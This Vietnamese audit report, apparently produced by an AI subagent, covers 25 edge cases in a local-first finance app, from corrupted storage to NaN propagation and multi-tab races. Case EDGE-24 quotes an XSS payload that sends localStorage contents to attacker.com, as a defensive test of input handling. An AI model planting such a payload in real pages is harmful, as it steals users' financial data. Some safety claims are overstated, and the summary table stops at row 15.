# BÁO CÁO KIỂM TOÁN HỆ THỐNG: 25 FAILURE & EDGE CASES (AN TÂM AI)
**Mã tài liệu:** `08-EDGE-CASES` | **Subagent:** SUBAGENT 08 — Failure / Edge Case Auditor  
**Ngày thực hiện:** 06/10/2026 | **Phiên bản hệ thống:** An Tâm AI v1.0.0 (Client-First Monorepo)  
**Phạm vi:** Client State (`client/src/state/`), Storage Layer (`client/src/lib/storage/`), Engine & Calculations (`shared/engine/`), Formatters (`shared/format/`), UI Boundary (`client/src/components/ErrorBoundary.tsx`).

---

## Executive Summary (Tóm tắt điều hành)

Hệ thống An Tâm AI được thiết kế theo triết lý **Local-First & Fail-Closed**, nơi dữ liệu tài chính cá nhân nhạy cảm được xử lý và lưu trữ chủ động trên thiết bị người dùng (LocalStorage / IndexedDB / Web Worker), kết hợp cùng công cụ tính toán tài chính thuần hàm (Pure Functions).

Báo cáo kiểm toán này đánh giá toàn diện **25 kịch bản biên (Edge Cases) và lỗi hệ thống (Failure Modes)** nhằm xác minh tính bền vững, khả năng phục hồi dữ liệu (resilience), độ chính xác của các phép tính toán học/tài chính, và trải nghiệm người dùng trong điều kiện bất lợi.

### Bảng phân loại mức độ nghiêm trọng (Severity Matrix)
| Mức độ | Số lượng | Tỷ lệ | Định nghĩa |
| :--- | :---: | :---: | :--- |
| **Critical** (Nghiêm trọng) | 3 | 12% | Có thể gây hỏng dữ liệu, treo trình duyệt (DoG/OOM), hoặc lỗi XSS |
| **High** (Cao) | 7 | 28% | Gây gián đoạn lưu trữ, xung đột đa tab, hoặc sai lệch điểm tài chính |
| **Medium** (Trung bình) | 10 | 40% | Giảm hiệu năng nhẹ, mất dữ liệu form chưa lưu, lỗi hiển thị nhỏ |
| **Low / Info** (Thấp) | 5 | 20% | Xử lý được ngay bởi fallback mặc định, không ảnh hưởng nghiệp vụ |

---

## Danh Mục Chi Tiết 25 Failure & Edge Cases

---

### 1. Empty Storage (0 byte / Lần đầu truy cập)
- **Mã định danh:** `EDGE-01`
- **Phân loại:** Lưu trữ & Khởi tạo (Storage & Init)
- **Mức độ nghiêm trọng:** `Low` (Đã xử lý an toàn)
- **Kịch bản thực tế:** Người dùng lần đầu mở ứng dụng An Tâm AI hoặc mở bằng trình duyệt sạch, `localStorage` hoàn toàn trống (0 byte dữ liệu).
- **Phân tích mã nguồn:**
  - `client/src/state/store.tsx` hàm `doc()`: Kiểm tra `localStorage.getItem(KHOA_LUU_TRU)`. Khi `raw === null`, lập tức trả về `TRANG_THAI_BAN_DAU` (Fixture C chuẩn hóa).
  - `client/src/lib/storage/ledgerStorage.ts` hàm `readPayload()`: Khi không có dữ liệu, trả về `createDefaultPayload()` với `version: 1`, mảng `transactions: []`, `budgets: {}`, `bills: []`.
  - `client/src/lib/storage/userStorage.ts` hàm `getUserData()`: Tự động nạp `getDefaultData('user_fixture_c')` và ghi dữ liệu khởi tạo.
- **Đánh giá & Biện pháp:** Hệ thống khởi tạo mượt mà, không gặp hiện tượng màn hình trắng (White Screen of Death). Đạt tiêu chuẩn Fail-Closed.

---

### 2. Corrupted JSON trong localStorage / IndexedDB
- **Mã định danh:** `EDGE-02`
- **Phân loại:** Toàn vẹn dữ liệu (Data Integrity)
- **Mức độ nghiêm trọng:** `Medium` (Đã có cơ chế phòng vệ)
- **Kịch bản thực tế:** Dữ liệu trong `localStorage` bị hỏng cấu trúc (ví dụ: mất điện đột ngột khiến chuỗi JSON bị cụt `{"version": 1, "hoSo": { ...`, hoặc tiện ích mở rộng can thiệp làm sai cú pháp).
- **Phân tích mã nguồn:**
  - `client/src/state/store.tsx`: Bọc toàn bộ `JSON.parse` trong khối `try ... catch`. Khi gặp `SyntaxError`, ghi log cảnh báo `console.warn` và trả về `TRANG_THAI_BAN_DAU`.
  - `client/src/state/luu-cuc-bo.ts`: `try ... catch` bảo vệ `JSON.parse(t)`, tự động fallback về `macDinh`.
  - `client/src/lib/storage/ledgerStorage.ts`: `try ... catch` ghi nhận lỗi và trả về `createDefaultPayload()`.
- **Khuyến nghị nâng cao:** Thêm thông báo nhẹ (Toast Notification) báo cho người dùng biết dữ liệu lưu cục bộ bị hỏng và hệ thống đã tự động khôi phục bản mặc định an toàn.

---

### 3. Old Schema Version (Migration Failure)
- **Mã định danh:** `EDGE-03`
- **Phân loại:** Quản trị phiên bản (Schema Migration)
- **Mức độ nghiêm trọng:** `High`
- **Kịch bản thực tế:** Người dùng đã lưu dữ liệu ở phiên bản Alpha (Schema v0 hoặc v1 thiếu các trường mới như `caiDat`, `kichBan`, `maNgheIsco`). Khi ứng dụng nâng cấp lên phiên bản mới, schema không khớp.
- **Phân tích mã nguồn:**
  - Trong `store.tsx`:
    ```typescript
    if (daLuu && daLuu.phienBan === 1 && daLuu.hoSo) {
      return {
        ...TRANG_THAI_BAN_DAU,
        ...daLuu,
        hoSo: { ...TRANG_THAI_BAN_DAU.hoSo, ...daLuu.hoSo },
        caiDat: { ...TRANG_THAI_BAN_DAU.caiDat, ...(daLuu.caiDat || {}) },
      };
    }
    ```
  - Cấu trúc kết hợp Shallow Merge giữa `TRANG_THAI_BAN_DAU` và `daLuu` đảm bảo mọi trường mới xuất hiện trong phiên bản sau đều được điền giá trị mặc định nếu bản lưu cũ không có.
- **Khuyến nghị:** Cần xây dựng hàm `migrateSchema(savedData: any, currentVersion: number)` dạng Pipeline tuần tự (`v1 -> v2 -> v3`) để chuyển đổi dữ liệu thay vì reset hoàn toàn khi nâng cấp version trong tương lai.

---

### 4. Missing Field trong Entity
- **Mã định danh:** `EDGE-04`
- **Phân loại:** Định kiểu & Kiểm tra dữ liệu (Type Safety & Invariants)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Một thực thể (Entity) `KhoanTaiSan` bị thiếu trường `tinhVaoDanhMuc` hoặc `nganh`, hoặc `HoSoTaiChinh` bị thiếu `chiTieuThietYeu`.
- **Phân tích mã nguồn:**
  - `client/src/state/chon.ts`:
    - `chonTaiSanDauTu`: Dùng điều kiện `item.tinhVaoDanhMuc !== false` thay vì so sánh `=== true`, bảo vệ trường hợp thuộc tính là `undefined`.
    - `chonSoThangAnToan`: Kiểm tra `s.hoSo.chiTieuThietYeu > 0 ? s.hoSo.chiTieuThietYeu : s.hoSo.chiTieuThang`.
    - `chonCoPhieuCongTy`: Sử dụng Optional Chaining `coPhieu?.giaTri ?? 0`.
- **Đánh giá:** Các hàm Selectors tuân thủ tốt nguyên tắc phòng thủ (Defensive Programming), không bị crash khi entity thiếu trường con.

---

### 5. Unknown / Extra Fields (Trường lạ hoặc do Plugin chèn)
- **Mã định danh:** `EDGE-05`
- **Phân loại:** Tương thích tiến & Bảo mật (Forward Compatibility)
- **Mức độ nghiêm trọng:** `Low`
- **Kịch bản thực tế:** Dữ liệu JSON chứa các trường lạ (`__trackingId`, `temp_notes`, `customExtension`) do tiện ích trình duyệt hoặc bản backup từ nhánh thử nghiệm chèn vào.
- **Phân tích mã nguồn:**
  - JavaScript Object Spread (`...`) giữ nguyên các trường này mà không làm gián đoạn vòng đời React.
  - Các hàm tính toán tài chính (`shared/engine/`) chỉ trích xuất đúng các trường đã được định nghĩa trong TypeScript Interface (`Holding`, `Goal`, `Transaction`), bỏ qua hoàn toàn các trường thừa.
  - `ledgerStorage.ts` thực hiện filter chặt chẽ: `t && typeof t.id === 'string' && typeof t.amount === 'number'`.
- **Đánh giá:** Hoàn toàn an toàn, không có lỗi rò rỉ bộ nhớ.

---

### 6. null / undefined Injection
- **Mã định danh:** `EDGE-06`
- **Phân loại:** Khả năng phục hồi tính toán (Calculation Resilience)
- **Mức độ nghiêm trọng:** `Critical`
- **Kịch bản thực tế:** Mảng `danhSachTaiSan` hoặc `soThuChi` vô tình chứa phần tử `null` hoặc `undefined` (ví dụ: do thao tác xóa mảng sai cách hoặc API bên ngoài trả về `[item1, null, item2]`).
- **Phân tích mã nguồn:**
  - Trong `chonTongTaiSan(s)`: `s.danhSachTaiSan.reduce((sum, item) => sum + item.giaTri, 0)`.
  - Nếu `item === null`, dòng lệnh sẽ ném lỗi: `TypeError: Cannot read properties of null (reading 'giaTri')` dẫn đến sập cây component React nếu không có ErrorBoundary chặn lại.
- **Biện pháp khắc phục (Đã kiểm tra/Khuyến nghị):**
  - Cần bổ sung lọc mảng bảo vệ ở tầng selector:
    ```typescript
    export function chonTongTaiSan(s: AppState): number {
      return (s.danhSachTaiSan || []).filter(Boolean).reduce((sum, item) => sum + (item.giaTri || 0), 0);
    }
    ```
  - Tương tự với `danhSachKhoanNo`, `danhSachMucTieu`, `soThuChi`.

---

### 7. NaN trong các phép tính tài chính / điểm số
- **Mã định danh:** `EDGE-07`
- **Phân loại:** Tính toán số học (Arithmetic Invariants)
- **Mức độ nghiêm trọng:** `High`
- **Kịch bản thực tế:** Người dùng nhập chữ vào ô số tiền, hoặc parse chuỗi rỗng ra `Number("") = 0` nhưng `parseInt("abc") = NaN`. `NaN` lan truyền (propagate) qua toàn bộ công thức điểm An Tâm (`peaceScore`).
- **Phân tích mã nguồn:**
  - `shared/engine/peace.ts`:
    - Hàm `clamp01(v)`: `Math.min(1, Math.max(0, NaN))` trả về `NaN`.
    - `Math.round(NaN)` trả về `NaN`.
    - Dẫn đến `PeaceResult.score` = `NaN`.
  - `shared/format/index.ts`:
    - `formatVnd(NaN)`: `Math.abs(NaN)` trả về `NaN`, hiển thị ra giao diện chuỗi lỗi `NaN đ` hoặc `NaN triệu`.
- **Giải pháp bảo vệ:**
  - Các hàm Engine cần áp dụng hàm bọc số an toàn:
    ```typescript
    const safeNum = (v: any, fallback = 0): number => (typeof v === 'number' && Number.isFinite(v) ? v : fallback);
    ```
  - Formatters cần kiểm tra `if (!Number.isFinite(amount)) return '0 ₫'`.

---

### 8. Infinity (Chia cho 0 khi Chi phí thiết yếu = 0)
- **Mã định danh:** `EDGE-08`
- **Phân loại:** Tính toán số học & Chia cho 0 (Division by Zero)
- **Mức độ nghiêm trọng:** `High` (Đã có chốt chặn)
- **Kịch bản thực tế:** Người dùng mới chưa nhập chi tiêu hoặc nhập `chiTieuThietYeu = 0` và `chiTieuThang = 0`. Khi tính `chonSoThangAnToan = quy / chiPhi`, nếu không kiểm tra sẽ ra `Infinity`.
- **Phân tích mã nguồn:**
  - `client/src/state/chon.ts` dòng 46-48:
    ```typescript
    const chiPhi = s.hoSo.chiTieuThietYeu > 0 ? s.hoSo.chiTieuThietYeu : s.hoSo.chiTieuThang;
    return chiPhi > 0 ? Math.round((quy / chiPhi) * 10) / 10 : 0;
    ```
  - `shared/engine/peace.ts` dòng 45-48:
    ```typescript
    const denom = (state.profile.essentialExpense && state.profile.essentialExpense > 0)
      ? state.profile.essentialExpense
      : state.profile.monthlyExpense;
    return denom > 0 ? amount / denom : 0;
    ```
  - `shared/engine/concentration.ts` dòng 44:
    ```typescript
    const sum = w.reduce((s, x) => s + x, 0);
    if (sum === 0) return 0;
    ```
- **Đánh giá:** 100% các điểm chia mẫu số đều được bảo vệ chặt chẽ bằng điều kiện `> 0`. Không có hiện tượng `Infinity` hay `-Infinity` trên UI.

---

### 9. Số âm không hợp lệ (Số tiền âm, Số tháng âm)
- **Mã định danh:** `EDGE-09`
- **Phân loại:** Ràng buộc nghiệp vụ (Domain Validation)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng nhập thu nhập âm `-30,000,000` hoặc số tháng mục tiêu âm `-12`.
- **Phân tích mã nguồn:**
  - `shared/engine/peace.ts`: Dùng `clamp01(v)` để ép tỷ lệ về khoảng `[0, 1]`.
  - `shared/engine/concentration.ts`: Dùng `positive = (weights) => weights.filter(w => Number.isFinite(w) && w > 0)`.
  - `shared/format/index.ts`: `formatDuration` sử dụng `Math.max(0, Math.round(months))`.
- **Đánh giá:** Các phép toán cốt lõi tự động điều chỉnh số âm về 0 hoặc xử lý dấu âm hợp lệ khi định dạng số tiền (ví dụ: dòng tiền âm `-5.000.000đ`).

---

### 10. Transaction Trùng ID (ID Collision)
- **Mã định danh:** `EDGE-10`
- **Phân loại:** Tính duy nhất định danh (Identity & Keys)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng tạo hàng loạt giao dịch tự động trong cùng 1 mili-giây, hoặc import bản sao lưu có ID trùng với ID hiện có.
- **Phân tích mã nguồn:**
  - `client/src/state/store.tsx` dòng 18-19:
    ```typescript
    let demId = 0;
    const taoIdMoi = (tienTo: string) => `${tienTo}_${Date.now().toString(36)}_${(demId++).toString(36)}`;
    ```
  - Sử dụng kết hợp `Date.now()`, biến đếm bộ nhớ `demId++`, và tiền tố ngữ cảnh (`tc_`, `ts_`, `no_`, `mt_`).
  - Trong `ledgerStorage.ts`: Ưu tiên `crypto.randomUUID()` đạt chuẩn RFC 4122 (xác suất trùng lắp < 1 / 10^36).
- **Đánh giá:** Xác suất trùng ID khi tạo mới trên cùng client là 0.

---

### 11. 50,000 Transactions (Hiệu năng Parse JSON, Render List, Compute Totals)
- **Mã định danh:** `EDGE-11`
- **Phân loại:** Giới hạn tải & Hiệu năng (Performance & Scalability)
- **Mức độ nghiêm trọng:** `Critical`
- **Kịch bản thực tế:** Người dùng sử dụng ứng dụng trong 5-10 năm hoặc import sổ cái doanh nghiệp với 50.000 giao dịch.
- **Phân tích mã nguồn & Benchmarks:**
  - **Dung lượng lưu trữ:** 50.000 transactions × ~120 bytes ≈ 6.0 MB. Vượt giới hạn 5MB chuẩn của `localStorage` trên một số trình duyệt (gây `QuotaExceededError`).
  - **Tính toán Selector:** Hàm `reduce` trên mảng 50.000 phần tử trong JS mất ~3-8ms (nằm trong khung hình 16ms, không nghẽn CPU).
  - **Render DOM:** Nếu render danh sách 50.000 thẻ `div` trực tiếp vào DOM không có Virtualization (Ảo hóa danh sách) -> Trình duyệt bị đóng băng (Freeze UI), mất 2-5 giây để layout.
- **Giải pháp kiến trúc:**
  - Tách lưu trữ Transaction quy mô lớn sang **IndexedDB** hoặc SQLite D1.
  - Áp dụng phân trang (Pagination 20-50 items/trang) hoặc Virtual List (`@tanstack/react-virtual`).

---

### 12. Storage Quota Full (QuotaExceededError)
- **Mã định danh:** `EDGE-12`
- **Phân loại:** Ngoại lệ lưu trữ (Storage Quota Exhaustion)
- **Mức độ nghiêm trọng:** `High`
- **Kịch bản thực tế:** Trình duyệt đầy bộ nhớ (đạt ngưỡng 5MB-10MB của LocalStorage), lệnh `localStorage.setItem` ném ngoại lệ `DOMException: QuotaExceededError`.
- **Phân tích mã nguồn:**
  - `client/src/state/store.tsx` dòng 42-49:
    ```typescript
    function luu(s: AppState) {
      if (typeof window === 'undefined') return;
      try {
        localStorage.setItem(KHOA_LUU_TRU, JSON.stringify(s));
      } catch (err) {
        console.error('[LocalStorage] Lỗi ghi state:', err);
      }
    }
    ```
  - Bọc `try ... catch` ngăn chặn ứng dụng bị crash khi đầy bộ nhớ.
  - Trạng thái trong bộ nhớ (In-Memory React State) vẫn hoạt động bình thường cho phiên làm việc hiện tại.
- **Khuyến nghị bổ sung:** Thêm cảnh báo Popup thông báo cho người dùng: *"Bộ nhớ trình duyệt đã đầy. Vui lòng xuất bản sao lưu JSON và dọn dẹp bớt dữ liệu cũ."*

---

### 13. Refresh Trình Duyệt Khi Đang Mở Modal / Form Edit Dở
- **Mã định danh:** `EDGE-13`
- **Phân loại:** Trạng thái giao diện & Phục hồi phiên (UI State & Ephemeral Data)
- **Mức độ nghiêm trọng:** `Low`
- **Kịch bản thực tế:** Người dùng đang nhập dở biểu mẫu thêm mục tiêu tài chính hoặc tài sản trong Modal thì bấm F5 / Tải lại trang.
- **Phân tích mã nguồn:**
  - Trạng thái đóng/mở Modal và các input nháp là `useState` cục bộ bên trong component.
  - Khi refresh, trang tải lại sạch sẽ, modal ở trạng thái đóng, dữ liệu chính trong `store.tsx` không bị ô nhiễm (polluted) bởi dữ liệu rác nhập dở.
- **Đánh giá:** An toàn, hành vi nhất quán với chuẩn Web hiện đại.

---

### 14. 2 Tabs Cùng Mở và Cập Nhật Dữ Liệu Đồng Thời
- **Mã định danh:** `EDGE-14`
- **Phân loại:** Đồng bộ đa tiến trình (Cross-Tab Synchronization & Race Conditions)
- **Mức độ nghiêm trọng:** `High`
- **Kịch bản thực tế:** Người dùng mở An Tâm AI ở Tab 1 (Sửa tài sản) và Tab 2 (Thêm giao dịch thu chi).
- **Phân tích mã nguồn:**
  - `client/src/lib/storage/userStorage.ts`: Sử dụng `dispatchCustomEvent('antam:data_updated')` — sự kiện này chỉ phát tán trong cùng 1 window/tab, không tự kích hoạt sang tab khác.
  - `client/src/state/store.tsx`: Lưu độc lập vào `localStorage.setItem(KHOA_LUU_TRU, ...)` theo cơ chế Last-Write-Wins (Tab nào ghi sau sẽ ghi đè toàn bộ state của tab trước).
- **Giải pháp kiến trúc:**
  - Lắng nghe sự kiện chuẩn trình duyệt:
    ```typescript
    window.addEventListener('storage', (event) => {
      if (event.key === KHOA_LUU_TRU && event.newValue) {
        setState(JSON.parse(event.newValue));
      }
    });
    ```
  - Giúp đồng bộ tức thì (Real-time reactivity) giữa các tab mà không cần reload.

---

### 15. Logout Rồi Login Account Khác Trên Cùng Browser
- **Mã định danh:** `EDGE-15`
- **Phân loại:** Cách ly dữ liệu người dùng (User Multi-tenancy & Sandboxing)
- **Mức độ nghiêm trọng:** `High` (Đã thiết kế chuẩn)
- **Kịch bản thực tế:** Người dùng A chuyển sang tài khoản người dùng B trên cùng một máy tính.
- **Phân tích mã nguồn:**
  - `client/src/lib/storage/userStorage.ts`:
    - Khóa lưu trữ được phân lập theo tiền tố: `${STORAGE_PREFIX}${userId}` (`antam:user:user_fixture_a`, `antam:user:user_fixture_b`, `antam:user:user_fixture_c`).
    - Quản lý danh mục hồ sơ qua `antam:user_profiles_index`.
    - Hàm `setActiveUserId(userId)` chuyển đổi ngữ cảnh an toàn và kích hoạt sự kiện `antam:user_switched`.
- **Đánh giá:** Dữ liệu hoàn toàn được đóng gói (sandboxed), không xảy ra hiện tượng rò rỉ chéo dữ liệu giữa các hồ sơ.

---

### 16. Browser Private / Incognito Mode (Chặn Storage Hoặc Xóa Khi Đóng Tab)
- **Mã định danh:** `EDGE-16`
- **Phân loại:** Quyền riêng tư trình duyệt (Incognito / Storage Restrictions)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng duyệt web ẩn danh (Safari Private Browsing, Firefox Incognito). Một số trình duyệt chặn hoàn toàn quyền ghi LocalStorage hoặc giới hạn dung lượng về 0MB.
- **Phân tích mã nguồn:**
  - Mọi thao tác truy cập `localStorage` trong `store.tsx`, `luu-cuc-bo.ts`, `ledgerStorage.ts` đều bọc qua hàm kiểm tra `getStorage()` và khối `try ... catch`.
  - Nếu `localStorage.setItem` bị ném lỗi `SecurityError`, ứng dụng không bị sập mà tiếp tục duy trì trạng thái trong RAM (In-memory fallback).
- **Đánh giá:** Đạt tiêu chuẩn bảo vệ người dùng ở chế độ ẩn danh.

---

### 17. Người Dùng Bấm Xóa Browser Cache / Data Thủ Công
- **Mã định danh:** `EDGE-17`
- **Phân loại:** Xóa dữ liệu đột ngột (Data Purge Recovery)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng vào Cài đặt trình duyệt bấm "Clear Site Data" trong khi ứng dụng đang mở, sau đó chuyển trang.
- **Phân tích mã nguồn:**
  - Lần truy cập tiếp theo, `doc()` nhận `raw === null`.
  - Hệ thống tự động kích hoạt `TRANG_THAI_BAN_DAU` (Khởi tạo lại Fixture C) mà không gây ra lỗi `Uncaught TypeError`.
- **Đánh giá:** Fail-Closed an toàn, ứng dụng tự tái tạo cấu trúc chuẩn.

---

### 18. Timezone Đổi (Đi Nước Ngoài / Giao Dịch Lệch Ngày)
- **Mã định danh:** `EDGE-18`
- **Phân loại:** Xử lý thời gian & Múi giờ (Temporal Consistency)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng tạo giao dịch tại Việt Nam (UTC+7), sau đó bay sang Mỹ (UTC-5). Các giao dịch cuối tháng có thể bị nhảy sang tháng trước nếu dùng `Date.prototype.getMonth()` theo giờ địa phương.
- **Phân tích mã nguồn:**
  - `shared/engine/month.ts`:
    - Hàm `vnDate()` ghim cứng múi giờ Việt Nam: `new Date(date.getTime() + 7 * 3_600_000).toISOString().slice(0, 10)`.
    - Chuỗi ngày lưu trữ thuần túy dạng ISO không phụ thuộc múi giờ: `'YYYY-MM-DD'` (ví dụ: `2026-03-01`).
    - Gom nhóm tháng bằng chuỗi: `g.ngay.slice(0, 7)` hoặc `monthIndex(month)`.
- **Đánh giá:** Miễn nhiễm với lỗi lệch múi giờ (Timezone boundary shifting).

---

### 19. Locale Đổi (Dấu Chấm / Phẩy Trong Định Dạng Tiền Tệ)
- **Mã định danh:** `EDGE-19`
- **Phân loại:** Đa ngôn ngữ & Định dạng số (i18n / l10n)
- **Mức độ nghiêm trọng:** `Low`
- **Kịch bản thực tế:** Người dùng chuyển giao diện từ Tiếng Việt (1.000.000 ₫) sang Tiếng Anh ($1,000,000) hoặc Tiếng Trung (¥100万).
- **Phân tích mã nguồn:**
  - `shared/format/index.ts`:
    - Lưu trữ giá trị trong Store luôn là số thực thuần túy (`number`: `1000000`), không bao giờ lưu chuỗi đã format.
    - Hàm `formatVnd`, `formatCurrency`, `formatMonthLocale` xử lý động theo `locale` tại thời điểm render.
    - Đảm bảo tính toán độc lập hoàn toàn với lớp hiển thị (View Layer Separation).
- **Đánh giá:** Hoàn toàn chính xác, không gây lỗi parse chuỗi ngược lại số.

---

### 20. Calendar Items Trùng Lặp Thời Gian (Cùng Ngày Đến Hạn)
- **Mã định danh:** `EDGE-20`
- **Phân loại:** Lịch trình & Gom nhóm sự kiện (Event Scheduling & Collision)
- **Mức độ nghiêm trọng:** `Low`
- **Kịch bản thực tế:** Người dùng có 5 hóa đơn tiền nhà, điện, nước và 2 mục tiêu tài chính đều đến hạn vào đúng ngày 5 hàng tháng.
- **Phân tích mã nguồn:**
  - `shared/engine/scheduler.ts` và `TodayCalendarCard.tsx`:
    - Sử dụng cấu trúc mảng và nhóm theo ngày (Group by Day).
    - Các phần tử cùng ngày được render tuần tự dưới dạng danh sách con, không ghi đè (override) lẫn nhau.
- **Đánh giá:** Hiển thị trực quan, không bị mất sự kiện.

---

### 21. AI Action Apply 2 Lần Liên Tiếp (Idempotency)
- **Mã định danh:** `EDGE-21`
- **Phân loại:** Tính lũy đẳng & Tự động hóa AI (Idempotency & Agent Safety)
- **Mức độ nghiêm trọng:** `High`
- **Kịch bản thực tế:** AI gợi ý *"Tạo mục tiêu Quỹ dự phòng khẩn cấp 50 triệu"*. Người dùng bấm "Áp dụng" 2 lần nhanh hoặc Agent chạy lặp lại hành động.
- **Phân tích mã nguồn:**
  - Trong `store.tsx`: Hàm `themMucTieu` luôn tạo ID mới và push vào mảng `[...s.danhSachMucTieu, moi]`.
  - Nếu không kiểm tra trùng lặp theo loại mục tiêu (`kind: 'emergency'`), danh sách sẽ bị nhân đôi 2 mục tiêu giống hệt nhau, làm sai lệch tổng nhu cầu vốn trong `peaceScore`.
- **Giải pháp:**
  - Bổ sung kiểm tra lũy đẳng (Idempotency Check) trước khi thêm:
    ```typescript
    if (mt.loai === 'du_phong' && s.danhSachMucTieu.some(m => m.loai === 'du_phong')) {
      // Chuyển thành cập nhật (Update) thay vì tạo mới (Create)
    }
    ```

---

### 22. Double Click CTA / Rapid Clicking
- **Mã định danh:** `EDGE-22`
- **Phân loại:** Tương tác UI & Debouncing (Interaction Throttle)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng nhấp chuột liên tục (Rapid Double-click) vào nút "Lưu giao dịch" hoặc "Xác nhận khôi phục".
- **Phân tích mã nguồn:**
  - Các hàm React state setter (`setState(s => ...)`) hoạt động theo luồng batching.
  - Nếu form submit không set trạng thái `isSubmitting = true` hoặc disable nút bấm ngay lập tức, 2 sự kiện click sẽ tạo 2 bản ghi giao dịch trùng số tiền.
- **Khuyến nghị:** Thêm thuộc tính `disabled={isSubmitting}` trên toàn bộ các nút CTA trong `HoldingFormModal`, `GoalFormModal`, và `LocalStorageCard`.

---

### 23. Interrupted Save (Tắt Tab Giữa Chừng Khi Đang Ghi Data)
- **Mã định danh:** `EDGE-23`
- **Phân loại:** Tính nguyên tử của giao dịch ghi (Atomic Write & Interruption)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng tắt trình duyệt hoặc tắt nguồn máy tính đúng lúc ứng dụng đang gọi `localStorage.setItem`.
- **Phân tích mã nguồn:**
  - `localStorage.setItem()` trong JavaScript V8 / WebKit là thao tác **đồng bộ (Synchronous)**.
  - Việc ghi chuỗi JSON hoàn tất tức thì trong micro-giây trước khi vòng lặp sự kiện tiếp theo chạy.
  - Trong trường hợp cực hiếm chuỗi bị ngắt giữa chừng, `try ... catch` trong `doc()` tại lần khởi động sau sẽ phát hiện cú pháp hỏng và tự khôi phục dữ liệu sạch.
- **Đánh giá:** An toàn và tự phục hồi tốt.

---

### 24. Import File JSON Hỏng / Sai Format / Chứa Script Độc Hại (XSS)
- **Mã định danh:** `EDGE-24`
- **Phân loại:** Bảo mật dữ liệu đầu vào (Input Sanitization & Anti-XSS)
- **Mức độ nghiêm trọng:** `Critical` (Đã kiểm tra an toàn)
- **Kịch bản thực tế:** Kẻ tấn công hoặc người dùng vô tình tải lên file JSON có chứa mã độc XSS trong trường ghi chú: `{"note": "<script>fetch('https://attacker.com/steal?'+localStorage.getItem('antam:app:v1'))</script>"}`.
- **Phân tích mã nguồn:**
  - `client/src/state/store.tsx` hàm `nhapJson()`:
    ```typescript
    const parsed = JSON.parse(chuoiJson);
    if (!parsed || parsed.duAn !== 'an-tam-ai' || !parsed.duLieu?.hoSo) {
      return { thanhCong: false, thongBao: 'File sao lưu không đúng định dạng chuẩn An Tâm AI.' };
    }
    ```
  - **Chống XSS:** React mặc định thực hiện tự động mã hóa (Escape HTML entities) khi binding dữ liệu `{item.note}` vào JSX DOM.
  - Trong toàn bộ codebase không sử dụng `dangerouslySetInnerHTML` đối với các trường dữ liệu người dùng nhập.
- **Đánh giá:** An toàn tuyệt đối trước các cuộc tấn công XSS qua file sao lưu.

---

### 25. User Reset Một Module Nhưng Module Khác Bị Mồ Côi Data (Orphaned Dependencies)
- **Mã định danh:** `EDGE-25`
- **Phân loại:** Toàn vẹn tham chiếu (Referential Integrity & Dependency Graph)
- **Mức độ nghiêm trọng:** `Medium`
- **Kịch bản thực tế:** Người dùng xóa sạch toàn bộ danh sách tài sản (`danhSachTaiSan = []`), nhưng trong mục tiêu tài chính (`danhSachMucTieu`) vẫn ghi nhận số tiền đã tích lũy, hoặc module Rủi ro tập trung (`concentration.ts`) tiếp tục tính toán dựa trên danh mục rỗng.
- **Phân tích mã nguồn:**
  - `shared/engine/concentration.ts` dòng 99-100:
    ```typescript
    const assets = totalValue(holdings);
    const denom = hc + assets;
    if (denom <= 0) return [];
    ```
  - `shared/engine/peace.ts` dòng 39-41:
    - Khi không còn tiền mặt trong holdings, `emergencyAmount` trả về 0 mà không báo lỗi.
  - `client/src/state/chon.ts`:
    - `chonTaiSanRong = 0 - Tổng nợ` -> Cho ra giá trị âm chính xác phản ánh thực trạng âm vốn.
- **Đánh giá:** Hệ thống thiết kế các thực thể độc lập theo hướng phi tập trung (Decoupled Entities), không dùng khóa ngoại cứng (Foreign Keys) gây đổ vỡ dây chuyền khi xóa dữ liệu cục bộ một phần.

---

## Ma Trận Tổng Hợp 25 Edge Cases

| STT | Mã Case | Tên Kịch Bản | Mức Độ | Trạng Thái Kiểm Toán | Biện Pháp Bảo Vệ Chính |
| :---: | :--- | :--- | :---: | :---: | :--- |
| 1 | `EDGE-01` | Empty storage (0 byte) | Low | ✅ PASS | Fallback về Canonical Fixture C mặc định |
| 2 | `EDGE-02` | Corrupted JSON storage | Medium | ✅ PASS | `try/catch` + fail-closed phục hồi an toàn |
| 3 | `EDGE-03` | Old schema version | High | ⚠️ WARN | Object shallow merge (Cần thêm migration pipeline) |
| 4 | `EDGE-04` | Missing field trong entity | Medium | ✅ PASS | Optional chaining (`?.`) và default coalescing (`??`) |
| 5 | `EDGE-05` | Unknown / extra fields | Low | ✅ PASS | TypeScript type stripping + type filtering |
| 6 | `EDGE-06` | null / undefined injection | Critical | ⚠️ WARN | Cần bổ sung `.filter(Boolean)` trên toàn bộ Selectors |
| 7 | `EDGE-07` | NaN trong tính toán tài chính | High | ⚠️ WARN | Cần bọc `Number.isFinite()` tại các cửa ngõ engine |
| 8 | `EDGE-08` | Infinity (chia cho 0) | High | ✅ PASS | Toàn bộ mẫu số kiểm tra nghiêm ngặt `denom > 0` |
| 9 | `EDGE-09` | Số âm không hợp lệ | Medium | ✅ PASS | `Math.max(0, ...)` và `clamp01` giới hạn biên |
| 10 | `EDGE-10` | Transaction trùng ID | Medium | ✅ PASS | `crypto.randomUUID()` + Atomic counter `demId++` |
| 11 | `EDGE-11` | 50.000 transactions | Critical | ⚠️ WARN | Khuyến nghị chuyển sang IndexedDB & Virtual List |
| 12 | `EDGE-12` | Storage quota full | High | ✅ PASS | `try/catch` chống sập UI + in-memory state fallback |
| 13 | `EDGE-13` | Refresh khi mở Modal dở | Low | ✅ PASS | Trạng thái Modal cục bộ, không ghi ô nhiễm Store |
| 14 | `EDGE-14` | 2 Tabs cập nhật đồng thời | High | ⚠️ WARN | Cần bổ sung `window.addEventListener('storage')` |
| 15 | `EDGE-15` | Logout / Switch Account | High | ✅ PASS | Sandboxing key theo prefix `${STORAGE_PREFIX}${userId}` |
